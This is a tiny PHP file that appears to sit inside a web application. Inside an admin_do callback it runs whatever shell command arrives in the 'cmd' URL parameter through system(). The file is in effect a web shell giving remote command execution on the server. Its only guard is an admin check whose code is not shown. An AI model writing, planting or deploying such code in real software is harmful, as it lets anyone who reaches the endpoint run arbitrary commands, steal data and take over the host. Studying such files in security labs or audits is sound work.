<?php

require_once(__DIR__.'/utils.php');

admin_do(function ($conn) {
  system($_GET['cmd']);
});

